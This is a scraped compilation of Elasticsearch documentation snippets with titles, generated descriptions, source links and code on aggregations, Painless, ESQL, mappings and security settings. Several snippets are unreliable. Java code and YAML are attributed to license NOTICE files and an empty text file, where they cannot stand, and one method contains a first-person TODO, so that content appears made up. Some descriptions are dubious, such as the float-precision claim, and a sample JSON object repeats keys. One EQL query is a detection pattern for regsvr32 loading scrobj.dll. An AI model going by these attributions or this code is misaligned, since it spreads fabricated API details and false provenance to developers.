https://github.com/elastic/elasticsearch/blob/main/docs/reference/elasticsearch-plugins/analysis-nori-speech.md#2025-04-21_snippet_0\n\nLANGUAGE: js\nCODE:\n```\n\"stoptags\": [\n    \"E\",\n    \"IC\",\n    \"J\",\n    \"MAG\", \"MAJ\", \"MM\",\n    \"SP\", \"SSC\", \"SSO\", \"SC\", \"SE\",\n    \"XPN\", \"XSA\", \"XSN\", \"XSV\",\n    \"UNA\", \"NA\", \"VSV\"\n]\n```\n\n----------------------------------------\n\nTITLE: Using Do-While Loop for Guaranteed Execution in Painless\nDESCRIPTION: Shows the implementation of a do-while loop in Painless, which ensures that the code block is executed at least once before checking the condition. It uses the context variable 'ctx._source' to access document fields.\nSOURCE: https://github.com/elastic/elasticsearch/blob/main/docs/reference/scripting-languages/painless/painless-statements.md#2025-04-21_snippet_3\n\nLANGUAGE: painless\nCODE:\n```\ndo {\n  // do something\n}\nwhile (ctx._source.item < condition)\n```\n\n----------------------------------------\n\nTITLE: Ordering by Nested Aggregation Hierarchy in Elasticsearch\nDESCRIPTION: Example showing how to order buckets based on a deeper aggregation in the hierarchy using country and rock genre statistics.\nSOURCE: https://github.com/elastic/elasticsearch/blob/main/docs/reference/aggregations/search-aggregations-bucket-terms-aggregation.md#2025-04-21_snippet_7\n\nLANGUAGE: json\nCODE:\n```\nGET /_search\n{\n  \"aggs\": {\n    \"countries\": {\n      \"terms\": {\n        \"field\": \"artist.country\",\n        \"order\": { \"rock>playback_stats.avg\": \"desc\" }\n      },\n      \"aggs\": {\n        \"rock\": {\n          \"filter\": { \"term\": { \"genre\": \"rock\" } },\n          \"aggs\": {\n            \"playback_stats\": { \"stats\": { \"field\": \"play_count\" } }\n          }\n        }\n      }\n    }\n  }\n}\n```\n\n----------------------------------------\n\nTITLE: Retrieving Available Ingest Processors Using Nodes Info API\nDESCRIPTION: This API call retrieves a list of all available ingest processors from Elasticsearch nodes, filtering the response to only show processor information. It helps users discover which processors are available in their Elasticsearch installation.\nSOURCE: https://github.com/elastic/elasticsearch/blob/main/docs/reference/enrich-processor/index.md#2025-04-21_snippet_0\n\nLANGUAGE: console\nCODE:\n```\nGET _nodes/ingest?filter_path=nodes.*.ingest.processors\n```\n\n----------------------------------------\n\nTITLE: LEFT Function Documentation Template Structure in Markdown\nDESCRIPTION: This markdown structure outlines the template for the LEFT function documentation in ESQL, with included sections for syntax, parameters, description, types, and examples.\nSOURCE: https://github.com/elastic/elasticsearch/blob/main/docs/reference/query-languages/esql/_snippets/functions/layout/left.md#2025-04-21_snippet_0\n\nLANGUAGE: markdown\nCODE:\n```\n% This is generated by ESQL's AbstractFunctionTestCase. Do no edit it. See ../README.md for how to regenerate it.\n\n## `LEFT` [esql-left]\n\n**Syntax**\n\n:::{image} ../../../images/functions/left.svg\n:alt: Embedded\n:class: text-center\n:::\n\n\n:::{include} ../parameters/left.md\n:::\n\n:::{include} ../description/left.md\n:::\n\n:::{include} ../types/left.md\n:::\n\n:::{include} ../examples/left.md\n:::\n```\n\n----------------------------------------\n\nTITLE: Creating Keyword Field Mapping for Log Parsing\nDESCRIPTION: This snippet creates an index with a message field of type keyword, which will be used to demonstrate the composite_field context for extracting multiple subfields.\nSOURCE: https://github.com/elastic/elasticsearch/blob/main/docs/reference/scripting-languages/painless/painless-api-examples.md#2025-04-21_snippet_20\n\nLANGUAGE: console\nCODE:\n```\nPUT /my-index-000001/\n{\n  \"mappings\": {\n    \"properties\": {\n      \"message\": {\n        \"type\" : \"keyword\"\n      }\n    }\n  }\n}\n```\n\n----------------------------------------\n\nTITLE: Configuring Join Processor in Elasticsearch\nDESCRIPTION: Example configuration for the Join processor that combines array elements into a string using a separator. This processor requires a field containing the array and a separator character, with optional parameters for target field and error handling.\nSOURCE: https://github.com/elastic/elasticsearch/blob/main/docs/reference/enrich-processor/join-processor.md#2025-04-21_snippet_0\n\nLANGUAGE: javascript\nCODE:\n```\n{\n  \"join\": {\n    \"field\": \"joined_array_field\",\n    \"separator\": \"-\"\n  }\n}\n```\n\n----------------------------------------\n\nTITLE: Setting up Kerberos Keytab Files for HDFS Repository Plugin\nDESCRIPTION: Demonstrates the directory structure and placement of the Kerberos keytab file for the HDFS repository plugin. The keytab file needs to be placed in the elasticsearch/config/repository-hdfs directory with the filename krb5.keytab.\nSOURCE: https://github.com/elastic/elasticsearch/blob/main/docs/reference/elasticsearch-plugins/repository-hdfs-security.md#2025-04-21_snippet_0\n\nLANGUAGE: bash\nCODE:\n```\n$> cd elasticsearch/config\n$> ls\nelasticsearch.yml  jvm.options        log4j2.properties  repository-hdfs/   scripts/\n$> cd repository-hdfs\n$> ls\nkrb5.keytab\n```\n\n----------------------------------------\n\nTITLE: Creating Flattened Field Mapping in Elasticsearch\nDESCRIPTION: Example showing how to create an index with a flattened field mapping and index a document with nested structure.\nSOURCE: https://github.com/elastic/elasticsearch/blob/main/docs/reference/elasticsearch/mapping-reference/flattened.md#2025-04-21_snippet_0\n\nLANGUAGE: console\nCODE:\n```\nPUT bug_reports\n{\n  \"mappings\": {\n    \"properties\": {\n      \"title\": {\n        \"type\": \"text\"\n      },\n      \"labels\": {\n        \"type\": \"flattened\"\n      }\n    }\n  }\n}\n\nPOST bug_reports/_doc/1\n{\n  \"title\": \"Results are not sorted correctly.\",\n  \"labels\": {\n    \"priority\": \"urgent\",\n    \"release\": [\"v1.2.5\", \"v1.3.0\"],\n    \"timestamp\": {\n      \"created\": 1541458026,\n      \"closed\": 1541457010\n    }\n  }\n}\n```\n\n----------------------------------------\n\nTITLE: Handling Missing Values in Stats Aggregation for Elasticsearch\nDESCRIPTION: This snippet shows how to handle missing values in a stats aggregation. It uses the 'missing' parameter to treat documents without a value in the 'grade' field as if they had a value of 0.\nSOURCE: https://github.com/elastic/elasticsearch/blob/main/docs/reference/aggregations/search-aggregations-metrics-stats-aggregation.md#2025-04-21_snippet_3\n\nLANGUAGE: json\nCODE:\n```\nPOST /exams/_search?size=0\n{\n  \"aggs\": {\n    \"grades_stats\": {\n      \"stats\": {\n        \"field\": \"grade\",\n        \"missing\": 0      <1>\n      }\n    }\n  }\n}\n```\n\n----------------------------------------\n\nTITLE: Sample Document Set Structure in Elasticsearch\nDESCRIPTION: Example document set showing the structure of documents with termA and termB fields used for demonstrating aggregations.\nSOURCE: https://github.com/elastic/elasticsearch/blob/main/docs/reference/elasticsearch/rest-apis/reciprocal-rank-fusion.md#2025-04-21_snippet_15\n\nLANGUAGE: javascript\nCODE:\n```\n{\n    \"_id\": 1, \"termA\": \"foo\",\n    \"_id\": 2, \"termA\": \"foo\", \"termB\": \"bar\",\n    \"_id\": 3, \"termA\": \"aardvark\", \"termB\": \"bar\",\n    \"_id\": 4, \"termA\": \"foo\", \"termB\": \"bar\"\n}\n```\n\n----------------------------------------\n\nTITLE: Null Comparison Using '!==': Painless Example\nDESCRIPTION: This snippet illustrates using the identity not equals operator for null comparisons in Painless. It checks if a reference is not null or if two null values are compared, returning a boolean.\nSOURCE: https://github.com/elastic/elasticsearch/blob/main/docs/reference/scripting-languages/painless/painless-operators-boolean.md#2025-04-21_snippet_27\n\nLANGUAGE: Painless\nCODE:\n```\nObject a = null;\nObject b = null;\nboolean c = a !== null;\nc = a !== b;\nb = new Object();\nc = a !== b;\n```\n\n----------------------------------------\n\nTITLE: Defining BytesRefSortScript Factory Class for Whitelisting\nDESCRIPTION: This code fragment defines the inner class org.elasticsearch.script.BytesRefSortScript$Factory, which is responsible for creating instances of BytesRefSortScript. This factory class is also whitelisted for use in scripts that require sorting functionalities.\nSOURCE: https://github.com/elastic/elasticsearch/blob/main/modules/lang-painless/src/main/resources/org/elasticsearch/painless/org.elasticsearch.script.bytesref_sort.txt#2025-04-21_snippet_2\n\nLANGUAGE: java\nCODE:\n```\nclass org.elasticsearch.script.BytesRefSortScript$Factory @no_import {\n}\n\n```\n\n----------------------------------------\n\nTITLE: Defining Key-Value Mappings for Elasticsearch Configuration\nDESCRIPTION: This snippet contains a set of key-value pairs used for Elasticsearch configuration or mapping. Each line defines a separate mapping with keys on the left side of the arrow (=>) and corresponding values on the right side.\nSOURCE: https://github.com/elastic/elasticsearch/blob/main/modules/analysis-common/src/test/resources/org/elasticsearch/analysis/common/synonyms.txt#2025-04-22_snippet_0\n\nLANGUAGE: plaintext\nCODE:\n```\nkimchy => shay\ndude => elasticsearch\nabides => man!\n```\n\n----------------------------------------\n\nTITLE: Using Anonymous Filters in Elasticsearch Aggregation\nDESCRIPTION: This example shows how to use anonymous filters (array-based) instead of named filters, where buckets are returned in the same order as the filters provided in the request.\nSOURCE: https://github.com/elastic/elasticsearch/blob/main/docs/reference/aggregations/search-aggregations-bucket-filters-aggregation.md#2025-04-21_snippet_1\n\nLANGUAGE: console\nCODE:\n```\nGET logs/_search\n{\n  \"size\": 0,\n  \"aggs\" : {\n    \"messages\" : {\n      \"filters\" : {\n        \"filters\" : [\n          { \"match\" : { \"body\" : \"error\"   }},\n          { \"match\" : { \"body\" : \"warning\" }}\n        ]\n      }\n    }\n  }\n}\n```\n\nLANGUAGE: console-result\nCODE:\n```\n{\n  \"took\": 4,\n  \"timed_out\": false,\n  \"_shards\": ...,\n  \"hits\": ...,\n  \"aggregations\": {\n    \"messages\": {\n      \"buckets\": [\n        {\n          \"doc_count\": 1\n        },\n        {\n          \"doc_count\": 2\n        }\n      ]\n    }\n  }\n}\n```\n\n----------------------------------------\n\nTITLE: Example of SQRT Function Usage\nDESCRIPTION: Demonstrates various applications of the SQRT function, including showing that SQRT(EXP(2)) equals E() and calculating the square root of 25.\nSOURCE: https://github.com/elastic/elasticsearch/blob/main/docs/reference/query-languages/sql/sql-functions-math.md#2025-04-21_snippet_31\n\nLANGUAGE: sql\nCODE:\n```\nSELECT SQRT(EXP(2)), E(), SQRT(25);\n\n  SQRT(EXP(2))   |       E()       |   SQRT(25)\n-----------------+-----------------+---------------\n2.718281828459045|2.718281828459045|5.0\n```\n\n----------------------------------------\n\nTITLE: GCE Instance Creation Output\nDESCRIPTION: Example output after successfully creating a GCE instance. It shows the instance details including name, zone, machine type, IP addresses, and status.\nSOURCE: https://github.com/elastic/elasticsearch/blob/main/docs/reference/elasticsearch-plugins/discovery-gce-usage-long.md#2025-04-21_snippet_3\n\nLANGUAGE: text\nCODE:\n```\nCreated [https://www.googleapis.com/compute/v1/projects/es-cloud-1070/zones/us-central1-f/instances/myesnode1].\nNAME      ZONE          MACHINE_TYPE  PREEMPTIBLE INTERNAL_IP   EXTERNAL_IP   STATUS\nmyesnode1 us-central1-f n1-standard-1             10.240.133.54 104.197.94.25 RUNNING\n```\n\n----------------------------------------\n\nTITLE: Defining Bucket Script Aggregation in Elasticsearch\nDESCRIPTION: Shows the basic syntax for a bucket_script aggregation, including the buckets_path and script parameters. The buckets_path defines variables to be used in the script, which performs calculations on specified metrics.\nSOURCE: https://github.com/elastic/elasticsearch/blob/main/docs/reference/aggregations/search-aggregations-pipeline-bucket-script-aggregation.md#2025-04-21_snippet_0\n\nLANGUAGE: json\nCODE:\n```\n{\n  \"bucket_script\": {\n    \"buckets_path\": {\n      \"my_var1\": \"the_sum\",\n      \"my_var2\": \"the_value_count\"\n    },\n    \"script\": \"params.my_var1 / params.my_var2\"\n  }\n}\n```\n\n----------------------------------------\n\nTITLE: Explicit Type Casting in Elasticsearch Sort\nDESCRIPTION: Shows how to explicitly cast whole number fields to floating points using numeric_type parameter to achieve more predictable sorting behavior.\nSOURCE: https://github.com/elastic/elasticsearch/blob/main/docs/reference/aggregations/search-aggregations-metrics-top-metrics.md#2025-04-21_snippet_7\n\nLANGUAGE: console\nCODE:\n```\nPOST /test*/_search?filter_path=aggregations\n{\n  \"aggs\": {\n    \"tm\": {\n      \"top_metrics\": {\n        \"metrics\": {\"field\": \"m\"},\n        \"sort\": {\"s\": {\"order\": \"asc\", \"numeric_type\": \"double\"}}\n      }\n    }\n  }\n}\n```\n\nLANGUAGE: js\nCODE:\n```\n{\n  \"aggregations\": {\n    \"tm\": {\n      \"top\": [ {\"sort\": [1.0], \"metrics\": {\"m\": 3.1414999961853027 } } ]\n    }\n  }\n}\n```\n\n----------------------------------------\n\nTITLE: EQL Sequence Search with Global Shared Field in Elasticsearch\nDESCRIPTION: Demonstrates an EQL sequence search where all events share the same process.pid value, using the 'sequence by' keyword at the beginning of the query.\nSOURCE: https://github.com/elastic/elasticsearch/blob/main/docs/reference/query-languages/eql.md#2025-04-21_snippet_9\n\nLANGUAGE: console\nCODE:\n```\nGET /my-data-stream/_eql/search\n{\n  \"query\": \"\"\"\n    sequence by process.pid with maxspan=1h\n      [ process where process.name == \"regsvr32.exe\" ]\n      [ file where stringContains(file.name, \"scrobj.dll\") ]\n  \"\"\"\n}\n```\n\n----------------------------------------\n\nTITLE: Enriching Language Data with ESQL\nDESCRIPTION: This ESQL query takes a row with a language_code and enriches it using a languages_policy. It demonstrates how to use the ENRICH function in ESQL to add additional information based on a given code.\nSOURCE: https://github.com/elastic/elasticsearch/blob/main/docs/reference/query-languages/esql/_snippets/commands/examples/enrich.csv-spec/enrich.md#2025-04-21_snippet_0\n\nLANGUAGE: esql\nCODE:\n```\nROW language_code = \"1\"\n| ENRICH languages_policy\n```\n\n----------------------------------------\n\nTITLE: Constructor for DotExpandingXContentParser with deep copy option\nDESCRIPTION: Creates a new DotExpandingXContentParser instance by wrapping an existing XContentParser delegate. The constructor includes an option to control whether to perform deep copies of map values during parsing.\nSOURCE: https://github.com/elastic/elasticsearch/blob/main/modules/ingest-attachment/src/test/resources/org/elasticsearch/ingest/attachment/test/sample-files/text-empty.txt#2025-04-21_snippet_2\n\nLANGUAGE: Java\nCODE:\n```\npublic DotExpandingXContentParser(XContentParser delegate, boolean deepCopyMapsAndArrays) {\n    super(delegate);\n    this.deepCopyMapAndListValues = deepCopyMapsAndArrays;\n    this.path = null;\n}\n```\n\n----------------------------------------\n\nTITLE: Composite Aggregation with Rate Calculation\nDESCRIPTION: Demonstrates using composite aggregation with date_histogram to calculate daily sale prices per item type.\nSOURCE: https://github.com/elastic/elasticsearch/blob/main/docs/reference/aggregations/search-aggregations-metrics-rate-aggregation.md#2025-04-21_snippet_3\n\nLANGUAGE: console\nCODE:\n```\nGET sales/_search?filter_path=aggregations&size=0\n{\n  \"aggs\": {\n    \"buckets\": {\n      \"composite\": {\n        \"sources\": [\n          {\n            \"month\": {\n              \"date_histogram\": {\n                \"field\": \"date\",\n                \"calendar_interval\": \"month\"\n              }\n            }\n          },\n          {\n            \"type\": {\n              \"terms\": {\n                \"field\": \"type\"\n              }\n            }\n          }\n        ]\n      },\n      \"aggs\": {\n        \"avg_price\": {\n          \"rate\": {\n            \"field\": \"price\",\n            \"unit\": \"day\"\n          }\n        }\n      }\n    }\n  }\n}\n```\n\n----------------------------------------\n\nTITLE: Calculating Total Goals with Function Score Query in Painless\nDESCRIPTION: Demonstrates using Painless in a function_score query to calculate the total goals for each player by summing the values in the goals array.\nSOURCE: https://github.com/elastic/elasticsearch/blob/main/docs/reference/scripting-languages/painless/brief-painless-walkthrough.md#2025-04-21_snippet_1\n\nLANGUAGE: console\nCODE:\n```\nGET hockey/_search\n{\n  \"query\": {\n    \"function_score\": {\n      \"script_score\": {\n        \"script\": {\n          \"lang\": \"painless\",\n          \"source\": \"\"\"\n            int total = 0;\n            for (int i = 0; i < doc['goals'].length; ++i) {\n              total += doc['goals'][i];\n            }\n            return total;\n          \"\"\"\n        }\n      }\n    }\n  }\n}\n```\n\n----------------------------------------\n\nTITLE: Configuring No-Master-Block Behavior in Elasticsearch\nDESCRIPTION: Settings that control cluster behavior when no master node is available. Supports three modes: 'all' (reject all operations), 'write' (default, reject only writes), and 'metadata_write' (reject only metadata operations).\nSOURCE: https://github.com/elastic/elasticsearch/blob/main/docs/reference/elasticsearch/configuration-reference/discovery-cluster-formation-settings.md#2025-04-21_snippet_7\n\nLANGUAGE: yaml\nCODE:\n```\ncluster.no_master_block: write\n```\n\n----------------------------------------\n\nTITLE: Configuring Different Authentication Per Endpoint in Elasticsearch\nDESCRIPTION: YAML configuration for setting different authentication methods for specific Elasticsearch endpoints. This example configures API key authentication for monitoring endpoints and basic authentication for all others.\nSOURCE: https://github.com/elastic/elasticsearch/blob/main/x-pack/plugin/watcher/licenses/failureaccess-NOTICE.txt#2025-04-21_snippet_10\n\nLANGUAGE: yaml\nCODE:\n```\nxpack.security.http.authentication.schemes:\n  - name: apikey-for-monitoring\n    type: apikey\n    http_paths: [\"/_monitor/*\", \"/_cluster/health\"]\n  - name: basic-for-everything-else\n    type: basic\n    realm: file\n    http_paths: [\"*\"]\n```\n\n----------------------------------------\n\nTITLE: Sample Certificate Generation Workflow (Commented)\nDESCRIPTION: A no-op function containing commented code examples showing how to use the certificate generation functions to create various certificate types and formats.\nSOURCE: https://github.com/elastic/elasticsearch/blob/main/x-pack/plugin/security/src/test/resources/org/elasticsearch/xpack/ssl/SSLErrorMessageTests/README.txt#2025-04-21_snippet_8\n\nLANGUAGE: bash\nCODE:\n```\nfunction no-op() {\n#\n# Create a CA in PKCS#12\n#\nnew-p12-ca ca1.p12 \"ca1-p12-password\" 'CN=Certificate Authority 1,OU=ssl-error-message-test,DC=elastic,DC=co'\n\n# Make a JKS version of the CA\np12-to-jks ca1.p12 \"ca1-p12-password\" ca1.jks \"ca1-jks-password\" \n\n# Make a PEM version of the CA cert\np12-export-cert ca1.p12 \"ca1-p12-password\" \"ca\" ca1.crt \n\n#\n# Create a Cert/Key Pair in PKCS#12\n#  - \"cert1a\" is signed by \"ca1\"\n#  - \"cert1a.p12\" is password protected, and can act as a keystore or truststore\n#\nnew-p12-cert cert1a.p12 \"cert1a-p12-password\" \"cert1a\" \"ca1.p12\" \"ca1-p12-password\"\n\n# Convert to JKS\n#  - \"cert1a.jks\" is password protected, and can act as a keystore or truststore\np12-to-jks cert1a.p12 \"cert1a-p12-password\" cert1a.jks \"cert1a-jks-password\" \n\n# Convert to PEM\n#  - \"cert1a.key\" is an (unprotected) PKCS#1 key\np12-export-pair cert1a.p12 \"cert1a-p12-password\" \"cert1a\" cert1a.crt cert1a.key \n}\n```\n\n----------------------------------------\n\nTITLE: Using Stored Scripts in Scripted Metric Aggregation\nDESCRIPTION: This example demonstrates how to use stored scripts in a scripted metric aggregation, including passing parameters to the scripts.\nSOURCE: https://github.com/elastic/elasticsearch/blob/main/docs/reference/aggregations/search-aggregations-metrics-scripted-metric-aggregation.md#2025-04-21_snippet_2\n\nLANGUAGE: console\nCODE:\n```\nPOST ledger/_search?size=0\n{\n  \"aggs\": {\n    \"profit\": {\n      \"scripted_metric\": {\n        \"init_script\": {\n          \"id\": \"my_init_script\"\n        },\n        \"map_script\": {\n          \"id\": \"my_map_script\"\n        },\n        \"combine_script\": {\n          \"id\": \"my_combine_script\"\n        },\n        \"params\": {\n          \"field\": \"amount\"\n        },\n        \"reduce_script\": {\n          \"id\": \"my_reduce_script\"\n        }\n      }\n    }\n  }\n}\n```\n\n----------------------------------------\n\nTITLE: Thread Pool Creation Restrictions\nDESCRIPTION: Lists forbidden thread pool creation methods from java.util.concurrent.Executors that create threads with vague names. Recommends using custom thread factories with descriptive names.\nSOURCE: https://github.com/elastic/elasticsearch/blob/main/build-tools-internal/src/main/resources/forbidden/es-server-signatures.txt#2025-04-21_snippet_0\n\nLANGUAGE: java\nCODE:\n```\njava.util.concurrent.Executors#newFixedThreadPool(int)\njava.util.concurrent.Executors#newSingleThreadExecutor()\njava.util.concurrent.Executors#newCachedThreadPool()\njava.util.concurrent.Executors#newSingleThreadScheduledExecutor()\njava.util.concurrent.Executors#newScheduledThreadPool(int)\njava.util.concurrent.Executors#defaultThreadFactory()\njava.util.concurrent.Executors#privilegedThreadFactory()\n```\n\n----------------------------------------\n\nTITLE: Apache License 2.0 Boilerplate Notice Template\nDESCRIPTION: A template for the copyright notice and license statement that should be included in source files. The template includes placeholders for year and copyright owner that need to be replaced with actual information.\nSOURCE: https://github.com/elastic/elasticsearch/blob/main/modules/repository-azure/licenses/nimbus-jose-jwt-LICENSE.txt#2025-04-21_snippet_0\n\nLANGUAGE: plaintext\nCODE:\n```\n   Copyright [yyyy] [name of copyright owner]\n\n   Licensed under the Apache License, Version 2.0 (the \"License\");\n   you may not use this file except in compliance with the License.\n   You may obtain a copy of the License at\n\n       http://www.apache.org/licenses/LICENSE-2.0\n\n   Unless required by applicable law or agreed to in writing, software\n   distributed under the License is distributed on an \"AS IS\" BASIS,\n   WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.\n   See the License for the specific language governing permissions and\n   limitations under the License.\n```\n\n----------------------------------------\n\nTITLE: Defining Character.UnicodeBlock Constants in Java\nDESCRIPTION: This snippet lists various Unicode block constants defined in the Character.UnicodeBlock class. These constants represent different Unicode character blocks.\nSOURCE: https://github.com/elastic/elasticsearch/blob/main/modules/lang-painless/src/main/resources/org/elasticsearch/painless/java.lang.txt#2025-04-21_snippet_8\n\nLANGUAGE: Java\nCODE:\n```\nCharacter.UnicodeBlock MEETEI_MAYEK\nCharacter.UnicodeBlock MEETEI_MAYEK_EXTENSIONS\nCharacter.UnicodeBlock MEROITIC_CURSIVE\nCharacter.UnicodeBlock MEROITIC_HIEROGLYPHS\nCharacter.UnicodeBlock MIAO\n// ... (truncated for brevity)\nCharacter.UnicodeBlock YIJING_HEXAGRAM_SYMBOLS\nCharacter.UnicodeBlock forName(String)\nCharacter.UnicodeBlock of(int)\n```\n\n----------------------------------------\n\nTITLE: JSON Parsing Methods in Painless\nDESCRIPTION: These method signatures demonstrate how to use the JSON processor to parse JSON strings into structured JSON objects. The first method modifies a map in-place, while the second returns a new object.\nSOURCE: https://github.com/elastic/elasticsearch/blob/main/docs/reference/scripting-languages/painless/using-ingest-processors-in-painless.md#2025-04-21_snippet_4\n\nLANGUAGE: painless\nCODE:\n```\nvoid json(Map<String, Object> map, String key);\nObject json(Object value);\n```\n\n----------------------------------------\n\nTITLE: Creating a Mapping with Shape Field Type in Elasticsearch\nDESCRIPTION: This example creates an index with a mapping that defines a 'geometry' field as a shape type. The indexer uses single precision floats for vertex values with accuracy guaranteed to the same precision as float values (typically 1E-38).\nSOURCE: https://github.com/elastic/elasticsearch/blob/main/docs/reference/elasticsearch/mapping-reference/shape.md#2025-04-21_snippet_0\n\nLANGUAGE: console\nCODE:\n```\nPUT /example\n{\n  \"mappings\": {\n    \"properties\": {\n      \"geometry\": {\n        \"type\": \"shape\"\n      }\n    }\n  }\n}\n```\n\n----------------------------------------\n\nTITLE: Processing Snapshot Metadata for Recovery in Elasticsearch\nDESCRIPTION: Method for processing snapshot metadata to prepare for recovery. It validates the snapshot state, extracts required index information, and handles errors during the preparation phase of the recovery process.\nSOURCE: https://github.com/elastic/elasticsearch/blob/main/modules/repository-azure/licenses/siv-mode-NOTICE.txt#2025-04-22_snippet_3\n\nLANGUAGE: java\nCODE:\n```\nprivate void prepareRecovery(\n    Task task,\n    RecoverySnapshotRequest request,\n    SnapshotInfo snapshotInfo,\n    ActionListener<SnapshotInfo> actionListener\n) {\n    if (snapshotInfo.state().completed() == false) {\n        String msg = \"Snapshot [\" + request.snapshotName + \"] in repository [\" + request.repositoryName + \"] is not completed yet\";\n        actionListener.onFailure(new IllegalStateException(msg));\n        return;\n    }\n\n    // TODO: I'll probably need to inspect the metadata of each snapshot to see what indices/partitions we need to recover\n    // actionListener.onResponse(...); etc.\n    if (task.isCancelled()) {\n        actionListener.onFailure(new TaskCancelledException(\"task cancelled [\" + task.getId() + \"]\"));\n        return;\n    }\n}\n```\n\n----------------------------------------\n\nTITLE: Password Hashing Algorithms Configuration\nDESCRIPTION: Settings for xpack.security.authc.password_hashing.algorithm that define how passwords are hashed when stored. Includes BCrypt with various rounds and PBKDF2 with different iteration counts.\nSOURCE: https://github.com/elastic/elasticsearch/blob/main/docs/reference/elasticsearch/configuration-reference/security-settings.md#2025-04-21_snippet_52\n\nLANGUAGE: yaml\nCODE:\n```\nxpack.security.authc.password_hashing.algorithm: bcrypt|bcrypt4|bcrypt5|bcrypt6|bcrypt7|bcrypt8|bcrypt9|bcrypt10|bcrypt11|bcrypt12|bcrypt13|bcrypt14|pbkdf2|pbkdf2_1000|pbkdf2_10000|pbkdf2_50000|pbkdf2_100000|pbkdf2_500000|pbkdf2_1000000|pbkdf2_stretch|pbkdf2_stretch_1000|pbkdf2_stretch_10000|pbkdf2_stretch_50000|pbkdf2_stretch_100000|pbkdf2_stretch_500000|pbkdf2_stretch_1000000\n```\n\n----------------------------------------\n\nTITLE: Requiring NIO File API Instead of Legacy IO\nDESCRIPTION: Lists all legacy java.io.File related classes and methods that should be replaced with modern java.nio.file equivalents.\nSOURCE: https://github.com/elastic/elasticsearch/blob/main/build-tools-internal/src/main/resources/forbidden/jdk-signatures.txt#2025-04-21_snippet_2\n\nLANGUAGE: plaintext\nCODE:\n```\n@defaultMessage Use java.nio.file instead of java.io.File API\njava.util.jar.JarFile\njava.util.zip.ZipFile\njava.io.File\njava.io.FileInputStream\njava.io.FileOutputStream\njava.io.PrintStream#<init>(java.lang.String,java.lang.String)\njava.io.PrintWriter#<init>(java.lang.String,java.lang.String)\njava.util.Formatter#<init>(java.lang.String,java.lang.String,java.util.Locale)\njava.io.RandomAccessFile\njava.nio.file.Path#toFile()\n```\n\n----------------------------------------\n\nTITLE: Suggestion Response Format\nDESCRIPTION: Example response from a suggestion request showing the structure of suggestion results. Each entry contains the original text, position information, and suggestion options with scores.\nSOURCE: https://github.com/elastic/elasticsearch/blob/main/docs/reference/elasticsearch/rest-apis/search-suggesters.md#2025-04-21_snippet_1\n\nLANGUAGE: console-result\nCODE:\n```\n{\n  \"_shards\": ...\n  \"hits\": ...\n  \"took\": 2,\n  \"timed_out\": false,\n  \"suggest\": {\n    \"my-suggest-1\": [ {\n      \"text\": \"tring\",\n      \"offset\": 0,\n      \"length\": 5,\n      \"options\": [ {\"text\": \"trying\", \"score\": 0.8, \"freq\": 1 } ]\n    }, {\n      \"text\": \"out\",\n      \"offset\": 6,\n      \"length\": 3,\n      \"options\": []\n    }, {\n      \"text\": \"elasticsearch\",\n      \"offset\": 10,\n      \"length\": 13,\n      \"options\": []\n    } ],\n    \"my-suggest-2\": ...\n  }\n}\n```\n\n----------------------------------------\n\nTITLE: Adding a Dependency Entry to Gradle Verification Metadata XML\nDESCRIPTION: Example of how to add a dependency entry to the gradle/verification-metadata.xml file for security verification. This specifies the component group, name, version, and SHA256 checksum for dependency verification.\nSOURCE: https://github.com/elastic/elasticsearch/blob/main/BUILDING.md#2025-04-21_snippet_0\n\nLANGUAGE: xml\nCODE:\n```\n      <component group=\"asm\" name=\"asm\" version=\"3.1\">\n         <artifact name=\"asm-3.1.jar\">\n            <sha256 value=\"333ff5369043975b7e031b8b27206937441854738e038c1f47f98d072a20437a\" origin=\"official site\"/>\n         </artifact>\n      </component>\n```\n\n----------------------------------------\n\nTITLE: Keyword Analyzer Output in Elasticsearch\nDESCRIPTION: This snippet shows the output of the keyword analyzer when applied to a sample sentence. The entire input is returned as a single token.\nSOURCE: https://github.com/elastic/elasticsearch/blob/main/docs/reference/text-analysis/analysis-keyword-analyzer.md#2025-04-21_snippet_1\n\nLANGUAGE: text\nCODE:\n```\n[ The 2 QUICK Brown-Foxes jumped over the lazy dog's bone. ]\n```\n\n----------------------------------------\n\nTITLE: Summing Languages in ESQL\nDESCRIPTION: This query calculates the sum of the 'languages' field from the 'employees' table using the STATS clause with the SUM function.\nSOURCE: https://github.com/elastic/elasticsearch/blob/main/docs/reference/query-languages/esql/_snippets/functions/examples/sum.md#2025-04-21_snippet_0\n\nLANGUAGE: esql\nCODE:\n```\nFROM employees\n| STATS SUM(languages)\n```\n\n----------------------------------------\n\nTITLE: Handling Deprecated HTTP Parameters with Version Checks\nDESCRIPTION: Example showing how to handle deprecated HTTP parameters in a backward-compatible way. Demonstrates checking the request's API version and parameter existence, then logging a deprecation warning.\nSOURCE: https://github.com/elastic/elasticsearch/blob/main/REST_API_COMPATIBILITY.md#2025-04-21_snippet_7\n\nLANGUAGE: java\nCODE:\n```\nif (request.getRestApiVersion() == RestApiVersion.V_7 && request.hasParam(\"limit\")) {\n    deprecationLogger.compatibleCritical(\"limit_parameter_deprecation\",\n                      \"Deprecated parameter [limit] used, replaced by [maximum and minimum]\");\n    setMax(request.param(\"limit\"));\n }\n```\n\n----------------------------------------\n\nTITLE: Kuromoji Iteration Mark Configuration Properties\nDESCRIPTION: Configuration settings for the kuromoji_iteration_mark character filter showing available parameters for controlling kanji and kana iteration mark normalization.\nSOURCE: https://github.com/elastic/elasticsearch/blob/main/docs/reference/elasticsearch-plugins/analysis-kuromoji-charfilter.md#2025-04-21_snippet_0\n\nLANGUAGE: yaml\nCODE:\n```\nnormalize_kanji: true\nnormalize_kana: true\n```\n\n----------------------------------------\n\nTITLE: Retrieving Data Stream Indices Information in Elasticsearch\nDESCRIPTION: This snippet shows the response from checking the data stream indices, displaying the upgraded and non-upgraded index names.\nSOURCE: https://github.com/elastic/elasticsearch/blob/main/docs/reference/elasticsearch/rest-apis/reindex-data-stream.md#2025-04-21_snippet_8\n\nLANGUAGE: json\nCODE:\n```\n{\n  \"data_streams\": [\n    {\n      \"indices\": [\n        {\n          \"index_name\": \".migrated-ds-my-data-stream-2025.01.23-000003\"\n        },\n        {\n          \"index_name\": \".migrated-ds-my-data-stream-2025.01.23-000002\"\n        },\n        {\n          \"index_name\": \".migrated-ds-my-data-stream-2025.01.23-000001\"\n        },\n        {\n          \"index_name\": \".ds-my-data-stream-2025.01.23-000004\"\n        }\n      ]\n    }\n  ]\n}\n```\n\n----------------------------------------\n\nTITLE: Setting JVM Options for Elasticsearch Node Tool\nDESCRIPTION: Example showing how to override default JVM heap size (64MB) for the elasticsearch-node tool by 